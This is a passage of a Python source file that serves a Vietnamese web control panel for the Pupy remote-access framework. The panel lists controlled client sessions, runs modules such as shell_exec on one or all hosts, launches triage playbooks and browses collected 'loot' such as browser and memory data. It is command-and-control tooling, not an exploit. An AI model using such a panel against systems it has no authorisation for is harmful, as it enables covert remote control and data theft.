# -*- coding: utf-8 -*-
"""Handler trang chủ Web UI — đầy đủ chức năng tương đương server console."""

from pupy.pupylib.PupyWeb import RequestHandler


class WebUIIndexHandler(RequestHandler):
    def get(self):
        self.set_header('Content-Type', 'text/html; charset=utf-8')
        self.finish(_default_index_html())


def _default_index_html():
    return r'''<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Pupy — Giao diện Web</title>
  <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>
  <style>
    * { box-sizing: border-box; }
    :root {
      --bg: #f0f7ff;
      --surface: #ffffff;
      --surface2: #e8f4fd;
      --border: #b8d4e8;
      --text: #1a365d;
      --text-muted: #4a6fa8;
      --accent: #2563eb;
      --accent-hover: #1d4ed8;
      --success: #059669;
      --danger: #dc2626;
      --danger-hover: #b91c1c;
    }
    body { font-family: 'Segoe UI', system-ui, sans-serif; margin: 0; background: var(--bg); color: var(--text); min-height: 100vh; font-size: 14px; }
    .layout { display: flex; min-height: 100vh; }
    .sidebar { width: 220px; background: var(--surface); border-right: 1px solid var(--border); padding: 0.5rem 0; flex-shrink: 0; }
    .sidebar h2 { margin: 0 0.75rem 0.5rem; font-size: 1rem; color: var(--accent); font-weight: 600; }
    .sidebar a { display: block; color: var(--text-muted); text-decoration: none; padding: 0.35rem 0.75rem; margin: 0 0.2rem; border-radius: 4px; font-size: 0.9rem; transition: background .15s, color .15s; }
    .sidebar a:hover { background: var(--surface2); color: var(--text); }
    .sidebar a.active { background: var(--accent); color: #fff; }
    .main { flex: 1; padding: 0.75rem 1rem; overflow: auto; }
    h1 { margin: 0 0 0.5rem 0; font-size: 1.2rem; color: var(--text); font-weight: 600; border-bottom: 1px solid var(--border); padding-bottom: 0.35rem; }
    table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
    th, td { padding: 0.35rem 0.5rem; text-align: left; border-bottom: 1px solid var(--border); }
    th { background: var(--surface2); color: var(--text-muted); font-weight: 600; font-size: 0.8rem; }
    tr:hover { background: var(--surface2); }
    .card { background: var(--surface); border: 1px solid var(--border); border-radius: 6px; padding: 0.75rem 1rem; margin-bottom: 0.75rem; }
    button, .btn { background: var(--accent); color: #fff; border: none; padding: 0.3rem 0.6rem; border-radius: 4px; cursor: pointer; font-size: 0.8rem; margin: 0 0.15rem; font-weight: 500; }
    button:hover, .btn:hover { background: var(--accent-hover); color: #fff; }
    button:disabled { opacity: 0.6; cursor: not-allowed; }
    .btn-danger { background: var(--danger); color: #fff; }
    .btn-danger:hover { background: var(--danger-hover); color: #fff; }
    .btn-sm { padding: 0.2rem 0.4rem; font-size: 0.75rem; }
    input, select { padding: 0.35rem 0.5rem; border-radius: 4px; border: 1px solid var(--border); background: #fff; color: var(--text); width: 100%; max-width: 320px; font-size: 0.9rem; }
    input:focus, select:focus { outline: none; border-color: var(--accent); }
    pre { background: #fff; border: 1px solid var(--border); padding: 0.5rem 0.75rem; border-radius: 4px; overflow: auto; white-space: pre-wrap; font-size: 0.8rem; margin: 0.35rem 0; }
    .error { color: var(--danger); }
    .ok { color: var(--success); }
    .muted { color: var(--text-muted); font-size: 0.85rem; }
    .spinner { display: inline-block; width: 0.9rem; height: 0.9rem; border: 2px solid var(--border); border-top-color: var(--accent); border-radius: 50%; animation: spin 0.8s linear infinite; vertical-align: middle; margin-right: 0.35rem; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .stats { display: flex; gap: 0.5rem; flex-wrap: wrap; margin-bottom: 0.5rem; }
    .stat { background: var(--surface); border: 1px solid var(--border); border-radius: 6px; padding: 0.5rem 0.75rem; min-width: 90px; }
    .stat .val { font-size: 1.25rem; color: var(--accent); font-weight: 600; }
    .stat .label { font-size: 0.75rem; color: var(--text-muted); }
    .dashboard-stats { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 0.5rem; margin-bottom: 0.75rem; }
    .dashboard-stats .stat { min-width: 0; padding: 0.6rem 0.75rem; }
    .dashboard-stats .stat .val { font-size: 1.5rem; }
    .dashboard-meta { font-size: 0.85rem; color: var(--text-muted); margin-bottom: 0.75rem; }
    .mod { padding: 0.35rem 0; border-bottom: 1px solid var(--border); font-size: 0.85rem; }
    .mod-name { color: var(--accent); font-weight: 500; }
    .mod-doc { font-size: 0.8rem; color: var(--text-muted); margin-top: 0.15rem; }
    .config-section { margin-bottom: 0.75rem; }
    .config-section h3 { color: var(--text-muted); font-size: 0.9rem; margin: 0.35rem 0; }
    .config-section pre { margin: 0; padding: 0.35rem; font-size: 0.75rem; }
    .cmd-list { list-style: none; padding: 0; margin: 0.35rem 0; }
    .cmd-list li { padding: 0.25rem 0; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; font-size: 0.85rem; }
    .cmd-list .name { color: var(--accent); }
    .monitor-header { display: flex; align-items: center; gap: 0.5rem; flex-wrap: wrap; margin-bottom: 0.5rem; font-size: 0.85rem; }
    .live-dot { width: 6px; height: 6px; background: var(--success); border-radius: 50%; animation: pulse 2s infinite; }
    @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.5; } }
    .chart-wrap { background: var(--surface); border: 1px solid var(--border); border-radius: 6px; padding: 0.5rem 0.75rem; margin-bottom: 0.75rem; height: 240px; }
    .chart-wrap h3 { margin: 0 0 0.35rem 0; font-size: 0.9rem; color: var(--text-muted); }
    .monitor-stats { display: flex; gap: 0.5rem; flex-wrap: wrap; margin-bottom: 0.75rem; }
    .monitor-stats .stat { min-width: 100px; padding: 0.5rem; }
    .info-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 0.35rem; margin: 0.35rem 0; font-size: 0.85rem; }
    .info-grid dt { color: var(--text-muted); font-size: 0.8rem; margin: 0; }
    .info-grid dd { margin: 0 0 0.35rem 0; }
    .search-box { margin-bottom: 0.5rem; max-width: 280px; }
    .btn-refresh { margin-bottom: 0.35rem; }
    .detail-row { font-size: 0.8rem; }
    .module-run-btn { margin-left: 0.35rem; }
    .copy-btn { font-size: 0.7rem; padding: 0.15rem 0.3rem; }
    .api-list { list-style: none; padding: 0; margin: 0.35rem 0; }
    .api-list li { padding: 0.2rem 0; border-bottom: 1px solid var(--border); font-family: monospace; font-size: 0.8rem; }
    .help-search { margin-bottom: 0.5rem; max-width: 360px; }
    .selected-session-bar { background: var(--surface2); border: 1px solid var(--border); border-radius: 4px; padding: 0.35rem 0.75rem; margin: 0.35rem 0.2rem; font-size: 0.85rem; }
    .selected-session-bar .ok { margin-right: 0.35rem; }
    .btn-use-session { background: var(--accent); color: #fff; }
    .btn-use-session:hover { background: var(--accent-hover); color: #fff; }
    .section-title { font-size: 0.9rem; color: var(--text-muted); margin: 0 0 0.5rem 0; font-weight: 600; }
    .page-link { color: var(--accent); text-decoration: none; font-size: 0.85rem; }
    .page-link:hover { text-decoration: underline; }
    .page > p { margin: 0.25rem 0 0.5rem 0; }
    .page-link-as-btn { text-decoration: none; display: inline-block; }
    .quick-run-row { margin-bottom: 0.5rem; }
    .quick-run-row .btn { margin-right: 0.35rem; }
  </style>
</head>
<body>
  <div class="layout">
    <nav class="sidebar">
      <h2>Pupy</h2>
      <div id="selected-session-bar" class="selected-session-bar" style="display:none"></div>
      <a href="#" class="nav-link active" data-page="dashboard">Trạng thái server</a>
      <a href="#" class="nav-link" data-page="sessions">Phiên</a>
      <a href="#" class="nav-link" data-page="run">Chạy module</a>
      <a href="#" class="nav-link" data-page="playbooks">Playbook / Triage</a>
      <a href="#" class="nav-link" data-page="loot">Loot / Dữ liệu</a>
      <a href="#" class="nav-link" data-page="jobs">Job đang chạy</a>
      <a href="#" class="nav-link" data-page="monitoring">Biểu đồ realtime</a>
      <a href="#" class="nav-link" data-page="listeners">Listener</a>
      <a href="#" class="nav-link" data-page="config">Cấu hình</a>
      <a href="#" class="nav-link" data-page="modules">Danh sách module</a>
      <a href="#" class="nav-link" data-page="help">Tra lệnh / module</a>
      <a href="#" class="nav-link" data-page="about">Giới thiệu</a>
    </nav>
    <main class="main">
      <div id="page-monitoring" class="page" style="display:none">
        <h1>Biểu đồ realtime</h1>
        <p class="muted">Phiên, job, listener theo thời gian (cập nhật mỗi vài giây).</p>
        <div class="monitor-header">
          <span class="live-dot"></span>
          <span class="muted" id="monitor-status">Đang kết nối...</span>
          <span class="muted" id="monitor-last">—</span>
        </div>
        <div class="monitor-stats" id="monitor-stats"></div>
        <div class="chart-wrap">
          <h3>Phiên theo thời gian</h3>
          <canvas id="chart-sessions" height="220"></canvas>
        </div>
        <div class="chart-wrap">
          <h3>Job theo thời gian</h3>
          <canvas id="chart-jobs" height="220"></canvas>
        </div>
        <div class="chart-wrap">
          <h3>Listener theo thời gian</h3>
          <canvas id="chart-listeners" height="220"></canvas>
        </div>
      </div>
      <div id="page-dashboard" class="page">
        <h1>Trạng thái server</h1>
        <p class="muted">Số phiên, listener, job; phiên bản; phiên gần đây.</p>
        <div style="margin-bottom:0.75rem">
          <button class="btn" id="dashboard-refresh">Làm mới</button>
          <a href="#" class="btn page-link-as-btn" data-page="sessions">Xem phiên</a>
          <a href="#" class="btn page-link-as-btn" data-page="run">Chạy module</a>
          <a href="#" class="btn page-link-as-btn" data-page="monitoring">Biểu đồ</a>
        </div>
        <div class="dashboard-stats" id="dashboard-stats"></div>
        <div class="dashboard-meta" id="dashboard-meta"></div>
        <div class="card">
          <h2 class="section-title">Phiên gần đây</h2>
          <div id="dashboard-sessions-preview"></div>
          <p style="margin-top:0.5rem;margin-bottom:0"><a href="#" class="page-link" id="dashboard-goto-sessions">Xem tất cả phiên →</a></p>
        </div>
      </div>
      <div id="page-sessions" class="page" style="display:none">
        <h1>Phiên</h1>
        <p class="muted">Xem danh sách phiên (máy trạm). Chọn <strong>Dùng phiên này</strong> để nhắm một máy trạm khi chạy module. Kết thúc = thoát trên máy trạm; Ngắt = đóng kết nối ngay.</p>
        <div class="search-box"><input type="text" id="sessions-search" placeholder="Lọc theo mã, người dùng, máy chủ, nền tảng..."></div>
        <button class="btn btn-refresh" id="sessions-refresh">Làm mới</button>
        <div id="sessions-list"></div>
      </div>
      <div id="page-listeners" class="page" style="display:none">
        <h1>Listener</h1>
        <p class="muted">Xem listener server đang mở. Thêm listener trên console (sao chép lệnh bên dưới rồi dán vào console).</p>
        <button class="btn btn-refresh" id="listeners-refresh">Làm mới</button>
        <button class="btn btn-sm" id="listeners-copy-cmd">Sao chép lệnh: listen ssl</button>
        <div id="listeners-list"></div>
      </div>
      <div id="page-run" class="page" style="display:none">
        <h1>Chạy module</h1>
        <p class="muted">Chạy module trên một máy trạm (mã phiên) hoặc tất cả (để trống). Chọn phiên ở trang Phiên bằng &quot;Dùng phiên này&quot; thì mã phiên tự điền.</p>
        <div class="card quick-run-row">
          <span class="section-title">Chạy nhanh:</span>
          <button type="button" class="btn btn-sm" id="quick-run-get_info">get_info</button>
          <button type="button" class="btn btn-sm" id="quick-run-shell_exec">shell_exec</button>
          <button type="button" class="btn btn-sm" id="quick-run-ps">ps</button>
          <button type="button" class="btn btn-sm" id="quick-run-ls">ls</button>
          <span class="muted" style="margin-left:0.5rem">(điền module + tham số mẫu, bấm Chạy bên dưới)</span>
        </div>
        <div class="card" id="run-target-card" style="display:none">
          <span class="ok">Đang nhắm: Phiên </span><strong id="run-target-id"></strong>
          <button type="button" class="btn btn-sm" id="run-clear-target">Bỏ chọn phiên</button>
        </div>
        <div class="card">
          <p><label>Mã phiên (trống = tất cả) <input type="text" id="run-session-id" placeholder="1 hoặc để trống"></label></p>
          <p><label>Module <input type="text" id="run-module" list="run-module-list" placeholder="get_info, shell_exec, ps"></label></p>
          <datalist id="run-module-list"></datalist>
          <p id="run-module-desc" class="muted" style="font-size:0.85rem;margin-top:0.25rem"></p>
          <p><label>Tham số <input type="text" id="run-args" placeholder="vd. whoami hoặc /path"></label></p>
          <p><label><input type="checkbox" id="run-background"> Chạy nền (background)</label></p>
          <button id="run-btn">Chạy</button>
          <button class="btn copy-btn" id="run-copy-output">Sao chép kết quả</button>
        </div>
        <div class="card"><h3 style="margin-top:0;color:var(--text-muted);font-size:0.9rem">Kết quả</h3><pre id="run-output"></pre></div>
      </div>
      <div id="page-modules" class="page" style="display:none">
        <h1>Danh sách module</h1>
        <p class="muted">Tìm module theo tên hoặc mô tả. Bấm &quot;Chạy&quot; để mở trang Chạy module với module đã chọn.</p>
        <div class="search-box"><input type="text" id="module-search" placeholder="Tìm theo tên hoặc mô tả..."></div>
        <label class="muted">Lọc category: <select id="module-category-filter"><option value="">Tất cả</option></select></label>
        <button class="btn btn-refresh" id="modules-refresh">Làm mới</button>
        <div id="modules-list"></div>
      </div>
      <div id="page-playbooks" class="page" style="display:none">
        <h1>Playbook / Triage</h1>
        <p class="muted">Chạy chuỗi module thu thập/điều tra nhanh (playbook) trên một nhóm máy trạm (lọc theo campaign, nền tảng...). Chọn phiên ở trang Phiên để chạy playbook chỉ trên một máy.</p>
        <div class="card" id="playbook-target-card" style="display:none">
          <span class="ok">Đang nhắm: Phiên </span><strong id="playbook-target-id"></strong>
          <button type="button" class="btn btn-sm" id="playbook-clear-target">Bỏ chọn phiên</button>
        </div>
        <div class="card">
          <p><label>Tên playbook
            <select id="playbook-select" style="max-width:260px"></select>
          </label></p>
          <p id="playbook-modules" class="muted" style="font-size:0.85rem;margin-top:0.25rem"></p>
          <p><label>Lọc client (giống run -f, vd: <code>campaign:IR</code> hoặc <code>platform:win</code>) <input type="text" id="playbook-filter" placeholder="để trống = dùng filter mặc định/server hoặc chỉ phiên đã chọn"></label></p>
          <p><label>Tham số bổ sung (append cho từng bước) <input type="text" id="playbook-args" placeholder="vd. --verbose"></label></p>
          <p><label><input type="checkbox" id="playbook-background"> Chạy nền (không chờ kết thúc)</label></p>
          <button id="playbook-run-btn">Chạy playbook</button>
        </div>
        <div class="card">
          <h3 style="margin-top:0;color:var(--text-muted);font-size:0.9rem">Kết quả</h3>
          <pre id="playbook-output"></pre>
        </div>
      </div>
      <div id="page-loot" class="page" style="display:none">
        <h1>Loot / Dữ liệu</h1>
        <p class="muted">Xem dữ liệu đã thu thập từ các module (get_info, cloudinfo, loot_memory, netmon, browser_loot, ...). Lọc theo loại loot, campaign, và chuỗi tìm kiếm.</p>
        <div class="card">
          <p><label>Loại loot
            <select id="loot-kind" style="max-width:220px"></select>
          </label></p>
          <p><label>Campaign <input type="text" id="loot-campaign" placeholder="vd. IR2026 hoặc substring"></label></p>
          <p><label>Tìm kiếm <input type="text" id="loot-filter" placeholder="host / user / platform / nội dung"></label></p>
          <p><label>Số bản ghi mới nhất <input type="number" id="loot-limit" value="50" min="1" max="1000" style="max-width:90px"></label></p>
          <button class="btn btn-refresh" id="loot-refresh">Tải loot</button>
        </div>
        <div class="card">
          <h3 style="margin-top:0;color:var(--text-muted);font-size:0.9rem">Kết quả</h3>
          <div id="loot-results"></div>
        </div>
      </div>
      <div id="page-jobs" class="page" style="display:none">
        <h1>Job đang chạy</h1>
        <p class="muted">Xem và dừng job (module đang chạy trên máy trạm). Bấm <strong>Dừng</strong> để kết thúc job. Tạo job: trang Chạy module → tick Chạy nền → Chạy.</p>
        <button class="btn btn-refresh" id="jobs-refresh">Làm mới</button>
        <a href="#" class="btn btn-sm page-link-as-btn" data-page="run">Mở Chạy module</a>
        <div id="jobs-list"></div>
      </div>
      <div id="page-config" class="page" style="display:none">
        <h1>Cấu hình</h1>
        <p class="muted">Xem cấu hình server (chỉ đọc). Sửa trên console: <code>config set section key value</code>. Sao chép từng section hoặc toàn bộ.</p>
        <div class="search-box"><input type="text" id="config-search" placeholder="Tìm section hoặc key..."></div>
        <button class="btn btn-refresh" id="config-refresh">Làm mới</button>
        <button class="btn btn-sm" id="config-copy-all">Sao chép toàn bộ cấu hình</button>
        <div id="config-list"></div>
      </div>
      <div id="page-help" class="page" style="display:none">
        <h1>Tra lệnh / module</h1>
        <p class="muted">Tra mô tả lệnh server và module. Gõ để lọc.</p>
        <div class="help-search"><input type="text" id="help-search" placeholder="Tìm lệnh hoặc module..."></div>
        <h2 style="font-size:1rem;color:var(--text-muted)">Lệnh server</h2>
        <div id="commands-list"></div>
        <h2 style="font-size:1rem;color:var(--text-muted);margin-top:1rem">Modules</h2>
        <div id="help-modules-list"></div>
      </div>
      <div id="page-about" class="page" style="display:none">
        <h1>Giới thiệu</h1>
        <div class="card">
          <p><strong>Pupy — Giao diện Web</strong>: trạng thái server, phiên, chạy module, job, biểu đồ realtime, listener, cấu hình. Dùng trình duyệt thay console.</p>
          <p class="muted">Console: <code>help</code> lệnh, <code>help -M</code> module, <code>config list</code> cấu hình.</p>
        </div>
        <div id="serverinfo"></div>
        <div class="card">
          <h3 style="margin-top:0;color:var(--text-muted);font-size:0.9rem">Các endpoint API (GET, trừ khi ghi POST)</h3>
          <ul class="api-list">
            <li>/webui/api/ping</li>
            <li>/webui/api/serverinfo</li>
            <li>/webui/api/sessions — POST sessions/kill, sessions/drop</li>
            <li>/webui/api/listeners</li>
            <li>/webui/api/modules</li>
            <li>/webui/api/run (POST)</li>
            <li>/webui/api/jobs — POST jobs/kill</li>
            <li>/webui/api/config, /webui/api/config/list</li>
            <li>/webui/api/commands</li>
          </ul>
        </div>
      </div>
    </main>
  </div>
  <script>
(function() {
  var base = window.location.pathname.replace(/\/$/, '');
  var api = function(path) { return base + (base.endsWith('/') ? '' : '/') + path; };
  var FETCH_TIMEOUT = 12000;
  function fetchWithTimeout(u, opts) {
    var ctrl = new AbortController();
    var t = setTimeout(function() { ctrl.abort(); }, FETCH_TIMEOUT);
    return fetch(u, (opts || {}).signal ? opts : Object.assign(opts || {}, { signal: ctrl.signal })).finally(function() { clearTimeout(t); });
  }
  function fetchJson(u) { return fetchWithTimeout(u).then(function(r) { return r.json(); }); }
  var monitorInterval = null;
  var MONITOR_POLL_MS = 3000;
  var MAX_POINTS = 120;
  var chartSessions = null, chartJobs = null, chartListeners = null;
  var timeLabels = [], dataSessions = [], dataJobs = [], dataListeners = [];
  function showPage(name) {
    document.querySelectorAll('.page').forEach(function(el) { el.style.display = 'none'; });
    document.querySelectorAll('.nav-link').forEach(function(el) { el.classList.remove('active'); });
    var p = document.getElementById('page-' + name);
    if (p) p.style.display = 'block';
    var a = document.querySelector('.nav-link[data-page="' + name + '"]');
    if (a) a.classList.add('active');
    if (monitorInterval) { clearInterval(monitorInterval); monitorInterval = null; }
    if (name === 'monitoring') startMonitoring();
    var loaders = {
      dashboard: loadDashboard,
      sessions: loadSessions,
      listeners: loadListeners,
      jobs: loadJobs,
      modules: loadModules,
      about: loadAbout,
      config: loadConfig,
      help: loadHelp,
      run: loadRunPage,
      playbooks: loadPlaybooks,
      loot: loadLoot
    };
    if (loaders[name]) loaders[name]();
  }
  function fmtTime(ts) {
    if (!ts) return '—';
    var d = new Date(ts);
    return d.toLocaleTimeString('vi-VN') + '.' + (d.getMilliseconds() + '').padStart(3, '0');
  }
  function createChart(canvasId, label, color) {
    try {
      if (typeof Chart === 'undefined') return null;
      var ctx = document.getElementById(canvasId);
      if (!ctx) return null;
      return new Chart(ctx.getContext('2d'), {
        type: 'line',
        data: { labels: [], datasets: [{ label: label, data: [], borderColor: color, backgroundColor: color + '20', fill: true, tension: 0.3 }] },
        options: {
          responsive: true,
          maintainAspectRatio: false,
          plugins: { legend: { display: false } },
          scales: {
            x: {
              display: true,
              title: { display: true, text: 'Thời gian', color: '#4a6fa8' },
              grid: { color: '#d4e4f0' },
              ticks: { color: '#4a6fa8', maxTicksLimit: 12 }
            },
            y: {
              display: true,
              title: { display: true, text: 'Số lượng', color: '#4a6fa8' },
              min: 0,
              suggestedMax: 10,
              grid: { color: '#d4e4f0' },
              ticks: { color: '#4a6fa8', stepSize: 1 }
            }
          }
        }
      });
    } catch (e) { return null; }
  }
  function startMonitoring() {
    try {
      if (chartSessions == null) chartSessions = createChart('chart-sessions', 'Phiên', '#2563eb');
      if (chartJobs == null) chartJobs = createChart('chart-jobs', 'Job', '#059669');
      if (chartListeners == null) chartListeners = createChart('chart-listeners', 'Listener', '#b45309');
    } catch (e) {}
    function poll() {
      fetchJson(api('api/serverinfo')).then(function(d) {
        document.getElementById('monitor-status').textContent = 'Cập nhật mỗi ' + (MONITOR_POLL_MS/1000) + 's';
        document.getElementById('monitor-last').textContent = 'Cập nhật lúc ' + fmtTime(d.ts);
        document.getElementById('monitor-stats').innerHTML = '<div class="stat"><span class="val">' + (d.sessions !== undefined ? d.sessions : 0) + '</span><br><span class="label">Phiên</span></div><div class="stat"><span class="val">' + (d.listeners !== undefined ? d.listeners : 0) + '</span><br><span class="label">Listener</span></div><div class="stat"><span class="val">' + (d.jobs !== undefined ? d.jobs : 0) + '</span><br><span class="label">Job</span></div>';
        var t = d.ts ? new Date(d.ts).toLocaleTimeString('vi-VN') : '';
        timeLabels.push(t);
        dataSessions.push(d.sessions !== undefined ? d.sessions : 0);
        dataJobs.push(d.jobs !== undefined ? d.jobs : 0);
        dataListeners.push(d.listeners !== undefined ? d.listeners : 0);
        if (timeLabels.length > MAX_POINTS) { timeLabels.shift(); dataSessions.shift(); dataJobs.shift(); dataListeners.shift(); }
        if (chartSessions && chartSessions.data) { chartSessions.data.labels = timeLabels.slice(); chartSessions.data.datasets[0].data = dataSessions.slice(); chartSessions.update(); }
        if (chartJobs && chartJobs.data) { chartJobs.data.labels = timeLabels.slice(); chartJobs.data.datasets[0].data = dataJobs.slice(); chartJobs.update(); }
        if (chartListeners && chartListeners.data) { chartListeners.data.labels = timeLabels.slice(); chartListeners.data.datasets[0].data = dataListeners.slice(); chartListeners.update(); }
      }).catch(function() {
        document.getElementById('monitor-status').textContent = 'Mất kết nối — thử lại sau.';
      });
    }
    poll();
    monitorInterval = setInterval(poll, MONITOR_POLL_MS);
  }
  var colLabels = { id: 'Mã', user: 'Người dùng', hostname: 'Máy chủ', platform: 'Nền tảng', release: 'Phiên bản HĐH', os_arch: 'Kiến trúc', address: 'Địa chỉ', tags: 'Nhãn' };
  function colHeader(c) { return colLabels[c] || c; }
  function loadDashboard() {
    fetchJson(api('api/serverinfo')).then(function(d) {
      var el = document.getElementById('dashboard-stats');
      if (d.error) { el.innerHTML = '<p class="error">' + d.error + '</p>'; return; }
      el.innerHTML = '<div class="stat"><span class="val">' + (d.sessions || 0) + '</span><br><span class="label">Phiên</span></div><div class="stat"><span class="val">' + (d.listeners || 0) + '</span><br><span class="label">Listener</span></div><div class="stat"><span class="val">' + (d.jobs || 0) + '</span><br><span class="label">Job</span></div>';
      var meta = document.getElementById('dashboard-meta');
      if (meta) meta.innerHTML = 'Phiên bản: ' + (d.version || '—') + ' · Python: ' + (d.python_version || '—');
      var sp = document.getElementById('dashboard-sessions-preview');
      fetchJson(api('api/sessions')).then(function(sd) {
        var sessions = (sd.sessions || []).slice(0, 10);
        if (!sessions.length) { sp.innerHTML = '<p class="muted">Chưa có phiên.</p>'; return; }
        var cols = ['id','user','hostname','platform'];
        sp.innerHTML = '<table><tr>' + cols.map(function(c) { return '<th>' + colHeader(c) + '</th>'; }).join('') + '</tr>' + sessions.map(function(s) { return '<tr>' + cols.map(function(c) { return '<td>' + (s[c] !== undefined && s[c] !== null ? s[c] : '') + '</td>'; }).join('') + '</tr>'; }).join('') + '</table>';
      }).catch(function() { sp.innerHTML = '<p class="muted">Không tải được danh sách phiên.</p>'; });
    }).catch(function() { document.getElementById('dashboard-stats').innerHTML = '<p class="error">Không kết nối được.</p>'; });
  }
  var gotoSessionLink = document.getElementById('dashboard-goto-sessions');
  if (gotoSessionLink) gotoSessionLink.addEventListener('click', function(e) { e.preventDefault(); showPage('sessions'); });
  var dashboardRefresh = document.getElementById('dashboard-refresh');
  if (dashboardRefresh) dashboardRefresh.addEventListener('click', loadDashboard);
  document.querySelectorAll('.page-link-as-btn').forEach(function(a) {
    a.addEventListener('click', function(e) { e.preventDefault(); var p = a.getAttribute('data-page'); if (p) showPage(p); });
  });
  var _sessionsCache = [];
  function loadSessions() {
    document.getElementById('sessions-list').innerHTML = '<span class="spinner"></span> Đang tải...';
    fetchJson(api('api/sessions')).then(function(d) {
      var el = document.getElementById('sessions-list');
      if (d.error) { el.innerHTML = '<p class="error">' + d.error + '</p>'; return; }
      _sessionsCache = d.sessions || [];
      renderSessionsTable(el, _sessionsCache);
      bindSessionButtons(el);
    }).catch(function() { document.getElementById('sessions-list').innerHTML = '<p class="error">Không kết nối được.</p>'; });
  }
  function renderSessionsTable(el, sessions) {
    if (!sessions.length) { el.innerHTML = '<p class="muted">Không có phiên.</p>'; return; }
    var allKeys = [];
    sessions.forEach(function(s) { Object.keys(s).forEach(function(k) { if (allKeys.indexOf(k) === -1) allKeys.push(k); }); });
    var cols = ['id','user','hostname','platform','release','os_arch','address','tags'];
    cols = cols.filter(function(k) { return allKeys.indexOf(k) >= 0; }).concat(allKeys.filter(function(k) { return cols.indexOf(k) < 0; }));
    var th = cols.map(function(c) { return '<th>' + colHeader(c) + '</th>'; }).join('') + '<th>Điều khiển</th><th>Thao tác</th>';
    var rows = sessions.map(function(s) {
      var sid = s.id !== undefined ? s.id : '';
      var cells = cols.map(function(c) { var v = s[c]; return '<td class="detail-row">' + (v !== undefined && v !== null ? (typeof v === 'object' ? JSON.stringify(v) : String(v)) : '') + '</td>'; }).join('');
      return '<tr>' + cells + '<td><button class="btn btn-use-session btn-sm" data-use-session="' + sid + '">Dùng phiên này</button></td><td><button class="btn btn-danger btn-sm" data-session-kill="' + sid + '">Kết thúc</button> <button class="btn btn-danger btn-sm" data-session-drop="' + sid + '">Ngắt</button></td></tr>';
    });
    el.innerHTML = '<table><tr>' + th + '</tr>' + rows.join('') + '</table>';
  }
  function getSelectedSession() {
    try { return sessionStorage.getItem('pupy_selected_session'); } catch (e) { return null; }
  }
  function setSelectedSession(id) {
    try { if (id != null) sessionStorage.setItem('pupy_selected_session', String(id)); else sessionStorage.removeItem('pupy_selected_session'); } catch (e) {}
    updateSelectedSessionBar();
    var runId = document.getElementById('run-session-id');
    if (runId) runId.value = id != null ? String(id) : '';
    var runCard = document.getElementById('run-target-card');
    var runTargetId = document.getElementById('run-target-id');
    if (runCard && runTargetId) { if (id != null) { runCard.style.display = 'block'; runTargetId.textContent = id; } else { runCard.style.display = 'none'; runTargetId.textContent = ''; } }
  }
  function clearSelectedSession() { setSelectedSession(null); }
  function updateSelectedSessionBar() {
    var id = getSelectedSession();
    var bar = document.getElementById('selected-session-bar');
    if (!bar) return;
    if (id) { bar.style.display = 'block'; bar.innerHTML = '<span class="ok">Đang nhắm: Phiên ' + id + '</span> <button type="button" class="btn btn-sm" id="sidebar-clear-session">Bỏ chọn</button>'; var btn = document.getElementById('sidebar-clear-session'); if (btn) btn.addEventListener('click', function() { clearSelectedSession(); }); }
    else { bar.style.display = 'none'; bar.innerHTML = ''; }
  }
  function bindSessionButtons(el) {
    el.querySelectorAll('[data-use-session]').forEach(function(btn) {
      btn.addEventListener('click', function() {
        var id = this.getAttribute('data-use-session');
        if (id) { setSelectedSession(id); alert('Đã chọn phiên ' + id + '. Khi chạy module (trang Chạy module) sẽ chỉ gửi tới máy trạm này. Bỏ chọn: bấm "Bỏ chọn" ở thanh bên hoặc trang Chạy module.'); }
      });
    });
    el.querySelectorAll('[data-session-kill]').forEach(function(btn) {
      btn.addEventListener('click', function() {
        var id = this.getAttribute('data-session-kill');
        fetch(api('api/sessions/kill'), { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ session_id: parseInt(id, 10) }) }).then(function(r) { return r.json(); }).then(function(res) { if (res.ok) loadSessions(); else alert(res.error || 'Lỗi'); });
      });
    });
    el.querySelectorAll('[data-session-drop]').forEach(function(btn) {
      btn.addEventListener('click', function() {
        var id = this.getAttribute('data-session-drop');
        fetch(api('api/sessions/drop'), { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ session_id: parseInt(id, 10) }) }).then(function(r) { return r.json(); }).then(function(res) { if (res.ok) loadSessions(); else alert(res.error || 'Lỗi'); });
      });
    });
  }
  var sessionsSearchEl = document.getElementById('sessions-search');
  if (sessionsSearchEl) sessionsSearchEl.addEventListener('input', function() {
    var q = this.value.toLowerCase().trim();
    var filtered = q ? _sessionsCache.filter(function(s) { return Object.keys(s).some(function(k) { var v = s[k]; return v != null && ('' + v).toLowerCase().indexOf(q) >= 0; }); }) : _sessionsCache;
    renderSessionsTable(document.getElementById('sessions-list'), filtered);
    bindSessionButtons(document.getElementById('sessions-list'));
  });
  var sessionsRefreshBtn = document.getElementById('sessions-refresh');
  if (sessionsRefreshBtn) sessionsRefreshBtn.addEventListener('click', loadSessions);
  function loadListeners() {
    document.getElementById('listeners-list').innerHTML = '<span class="spinner"></span> Đang tải...';
    fetchJson(api('api/listeners')).then(function(d) {
      var el = document.getElementById('listeners-list');
      if (d.error) { el.innerHTML = '<p class="error">' + d.error + '</p>'; return; }
      var list = d.listeners || [];
      el.innerHTML = list.length ? '<table><tr><th>Giao thức</th><th>Địa chỉ</th><th>Cổng</th></tr>' + list.map(function(l) { return '<tr><td>' + (l.name || '') + '</td><td>' + (l.address || '') + '</td><td>' + (l.port !== undefined ? l.port : '') + '</td></tr>'; }).join('') + '</table>' : '<p class="muted">Chưa có listener. Trên console gõ: listen ssl (hoặc giao thức khác).</p>';
    }).catch(function() { document.getElementById('listeners-list').innerHTML = '<p class="error">Không kết nối được.</p>'; });
  }
  var listenersRefreshBtn = document.getElementById('listeners-refresh');
  if (listenersRefreshBtn) listenersRefreshBtn.addEventListener('click', loadListeners);
  var listenersCopyCmd = document.getElementById('listeners-copy-cmd');
  if (listenersCopyCmd) listenersCopyCmd.addEventListener('click', function() {
